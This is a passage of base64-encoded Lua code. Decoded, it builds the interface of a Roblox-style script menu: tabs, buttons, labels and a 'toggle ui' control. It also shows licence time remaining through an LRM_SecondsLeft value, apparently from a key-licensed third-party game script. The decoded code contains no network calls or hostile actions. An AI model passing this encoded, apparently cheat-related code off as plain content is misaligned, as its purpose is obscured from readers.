CAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDAsIDAuNSk7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDEwLCAwLjUsIC0xKTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBUZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIG5vdCBMUk1fU2Vjb25kc0xlZnQgdGhlbgogICAgICAgICAgICAgICAgICAgIExSTV9TZWNvbmRzTGVmdCA9IG1hdGguaHVnZQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgbG9jYWwgdGltZV9sZWZ0ID0gdG9zdHJpbmcoKExSTV9TZWNvbmRzTGVmdCA8IG1hdGguaHVnZSBhbmQgIiIuLnRvc3RyaW5nKG1hdGguZmxvb3IoKChMUk1fU2Vjb25kc0xlZnQgLyA2MCkgLyA2MCkgLyAyNCkpLi4iIGRheXMiIG9yIExSTV9TZWNvbmRzTGVmdCA9PSBtYXRoLmh1Z2UgYW5kICJsaWZldGltZSIpKQoKICAgICAgICAgICAgICAgIGl0ZW1zWyAib3RoZXJfaW5mbyIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dExhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImluZm8iIF07CiAgICAgICAgICAgICAgICAgICAgUmljaFRleHQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSB0aGVtZXMucHJlc2V0LmFjY2VudDsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICc8Zm9udCBjb2xvcj0icmdiKDcyLCA3MiwgNzMpIj4nLi50aW1lX2xlZnQuLicsIDwvZm9udD4nIC4uIGNmZy5uYW1lOmxvd2VyKCkgLi4gY2ZnLnN1ZmZpeDpsb3dlcigpOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAtMTAsIDAuNSwgLTEpOwogICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigwLCAwLjUpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LlJpZ2h0OwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5mb250OwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7IGxpYnJhcnk6YXBwbHlfdGhlbWUoaXRlbXNbICJvdGhlcl9pbmZvIiBdLCAiYWNjZW50IiwgIlRleHRDb2xvcjMiKTsgICAgICAgIAogICAgICAgICAgICBlbmQgCgogICAgICAgICAgICBkbyAtLSBPdGhlcgogICAgICAgICAgICAgICAgbGlicmFyeTpkcmFnZ2lmeShpdGVtc1sgIm1haW4iIF0pCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnJlc2l6aWZ5KGl0ZW1zWyAibWFpbiIgXSkKICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgZnVuY3Rpb24gY2ZnLnRvZ2dsZV9tZW51KGJvb2wpIAogICAgICAgICAgICAgICAgLS0gV0lQIAogICAgICAgICAgICAgICAgLS0gaWYgY2ZnLnR3ZWVuIHRoZW4gCiAgICAgICAgICAgICAgICAtLSAgICAgY2ZnLnR3ZWVuOkNhbmNlbCgpCiAgICAgICAgICAgICAgICAtLSBlbmQgCgogICAgICAgICAgICAgICAgLS0gaXRlbXNbICJtYWluIiBdLlNpemUgPSBkaW0yKGl0ZW1zWyAibWFpbiIgXS5TaXplLlNjYWxlLlgsIGl0ZW1zWyAibWFpbiIgXS5TaXplLk9mZnNldC5YIC0gMjAsIGl0ZW1zWyAibWFpbiIgXS5TaXplLlNjYWxlLlksIGl0ZW1zWyAibWFpbiIgXS5TaXplLk9mZnNldC5ZIC0gMjApCiAgICAgICAgICAgICAgICAtLSBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAidGFiX2hvbGRlciIgXSwge1NpemUgPSBkaW0yKDEsIC0xOTYsIDEsIC04MSl9LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIDAuNCkKICAgICAgICAgICAgICAgIC0tIGNmZy50d2VlbiA9IAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgIm1haW4iIF0uVmlzaWJsZSA9IGJvb2wKICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgaXRlbXNbICJjbG9zZSBidXR0b24iIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgUGFyZW50ID0gbGlicmFyeVsgIml0ZW1zIiBdOwogICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMjAsIDEsIC0yMCk7CiAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMCwgMSk7CiAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCA3NSwgMCwgNTApOwogICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgIEF1dG9CdXR0b25Db2xvciA9IGZhbHNlOwogICAgICAgICAgICAgICAgVmlzaWJsZSA9IHRydWU7CiAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1LCAyNSwgMjkpCiAgICAgICAgICAgIH0pOwogICAgICAgICAgICAKICAgICAgICAgICAgaXRlbXNbICJvdGhlcl9pbmZvIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJjbG9zZSBidXR0b24iIF07CiAgICAgICAgICAgICAgICBSaWNoVGV4dCA9IHRydWU7CiAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMjQ1LCAyNDUsIDI0NSk7CiAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICBUZXh0ID0gInRvZ2dsZSB1aSI7CiAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgIFRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5DZW50ZXI7CiAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICBaSW5kZXggPSAyOwogICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiY2xvc2UgYnV0dG9uIiBdOwogICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDEwKQogICAgICAgICAgICB9KTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlTdHJva2UiICwgewogICAgICAgICAgICAgICAgQ29sb3IgPSByZ2IoMjMsIDIzLCAyOSk7CiAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImNsb3NlIGJ1dHRvbiIgXTsKICAgICAgICAgICAgICAgIEFwcGx5U3Ryb2tlTW9kZSA9IEVudW0uQXBwbHlTdHJva2VNb2RlLkJvcmRlcgogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIGxvY2FsIG9wZW4gPSB0cnVlIAogICAgICAgICAgICBpdGVtc1sgImNsb3NlIGJ1dHRvbiIgXS5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICAgICAgICAgICAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCBvciBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCB0aGVuCiAgICAgICAgICAgICAgICAgICAgb3BlbiA9IG5vdCBvcGVuIAoKICAgICAgICAgICAgICAgICAgICBjZmcudG9nZ2xlX21lbnUob3BlbikKICAgICAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybiBzZXRtZXRhdGFibGUoY2ZnLCBsaWJyYXJ5KQogICAgICAgIGVuZCAKCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTp0YWIocHJvcGVydGllcykKICAgICAgICAgICAgbG9jYWwgY2ZnID0gewogICAgICAgICAgICAgICAgbmFtZSA9IHByb3BlcnRpZXMubmFtZSBvciBwcm9wZXJ0aWVzLk5hbWUgb3IgInZpc3VhbHMiOyAKICAgICAgICAgICAgICAgIGljb24gPSBwcm9wZXJ0aWVzLmljb24gb3IgcHJvcGVydGllcy5JY29uIG9yICJodHRwOi8vd3d3LnJvYmxveC5jb20vYXNzZXQvP2lkPTYwMzQ3Njc2MDgiOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSBtdWx0aSAKICAgICAgICAgICAgICAgIHRhYnMgPSBwcm9wZXJ0aWVzLnRhYnMgb3IgcHJvcGVydGllcy5UYWJzIG9yIHsiTWFpbiIsICJNaXNjLiIsICJTZXR0aW5ncyJ9OwogICAgICAgICAgICAgICAgcGFnZXMgPSB7fTsgLS0gZGF0YSBzdG9yZSBmb3IgbXVsdGkgc2VjdGlvbnMKICAgICAgICAgICAgICAgIGN1cnJlbnRfbXVsdGk7IAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtcyA9IHt9OwogICAgICAgICAgICB9IAoKICAgICAgICAgICAgbG9jYWwgaXRlbXMgPSBjZmcuaXRlbXM7IGRvIAogICAgICAgICAgICAgICAgaXRlbXNbICJ0YWJfaG9sZGVyIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gbGlicmFyeS5jYWNoZTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBWaXNpYmxlID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDE5NiwgMCwgNTYpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMjE2LCAxLCAtMTAxKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSBUYWIgYnV0dG9ucyAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImJ1dHRvbiIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IHNlbGYuaXRlbXNbICJidXR0b25faG9sZGVyIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBBdXRvQnV0dG9uQ29sb3IgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAzNSk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTY7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjksIDI5LCAyOSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImljb24iIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkltYWdlTGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgICAgICBJbWFnZUNvbG9yMyA9IHJnYig3MiwgNzIsIDczKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJ1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDAsIDAuNSk7CiAgICAgICAgICAgICAgICAgICAgICAgIEltYWdlID0gY2ZnLmljb247CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMTAsIDAuNSwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAyMiwgMCwgMjIpOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgfSk7IGxpYnJhcnk6YXBwbHlfdGhlbWUoaXRlbXNbICJpY29uIiBdLCAiYWNjZW50IiwgIkltYWdlQ29sb3IzIik7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJuYW1lIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoNzIsIDcyLCA3Myk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9IGNmZy5uYW1lOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJ1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgNDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWDsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNjsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJuYW1lIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nUmlnaHQgPSBkaW0oMCwgNSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDUpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiYnV0dG9uIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgNykKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJU3Ryb2tlIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgQ29sb3IgPSByZ2IoMjMsIDIzLCAyOSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiYnV0dG9uIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBFbmFibGVkID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIEFwcGx5U3Ryb2tlTW9kZSA9IEVudW0uQXBwbHlTdHJva2VNb2RlLkJvcmRlcgogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgLS0gCgogICAgICAgICAgICAgICAgLS0gTXVsdGkgU2VjdGlvbnMKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgIm11bHRpX3NlY3Rpb25fYnV0dG9uX2hvbGRlciIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBsaWJyYXJ5LmNhY2hlOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFZpc2libGUgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlMaXN0TGF5b3V0IiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJtdWx0aV9zZWN0aW9uX2J1dHRvbl9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmcgPSBkaW0oMCwgNyk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyOwogICAgICAgICAgICAgICAgICAgICAgICBGaWxsRGlyZWN0aW9uID0gRW51bS5GaWxsRGlyZWN0aW9uLkhvcml6b250YWwKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJUGFkZGluZyIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdUb3AgPSBkaW0oMCwgOCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdCb3R0b20gPSBkaW0oMCwgNyk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibXVsdGlfc2VjdGlvbl9idXR0b25faG9sZGVyIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nUmlnaHQgPSBkaW0oMCwgNyk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDcpCiAgICAgICAgICAgICAgICAgICAgfSk7ICAgICAgICAgICAgICAgICAgICAgICAgCgogICAgICAgICAgICAgICAgICAgIGZvciBfLCBzZWN0aW9uIGluIGNmZy50YWJzIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRhdGEgPSB7aXRlbXMgPSB7fX0gCgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBtdWx0aV9pdGVtcyA9IGRhdGEuaXRlbXM7IGRvIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gQnV0dG9uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbXVsdGlfaXRlbXNbICJidXR0b24iIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQXV0b0J1dHRvbkNvbG9yID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJtdWx0aV9zZWN0aW9uX2J1dHRvbl9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAwLCAwLCAzOSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDbGlwc0Rlc2NlbmRhbnRzID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5YOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE2OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1LCAyNSwgMjkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbXVsdGlfaXRlbXNbICJuYW1lIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoNjIsIDYyLCA2Myk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9IHNlY3Rpb247CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IG11bHRpX2l0ZW1zWyAiYnV0dG9uIiBdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMCwgMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5YWTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gbXVsdGlfaXRlbXNbICJuYW1lIiBdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nUmlnaHQgPSBkaW0oMCwgNSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbXVsdGlfaXRlbXNbICJhY2NlbnQiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IG11bHRpX2l0ZW1zWyAiYnV0dG9uIiBdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDEwLCAxLCA0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI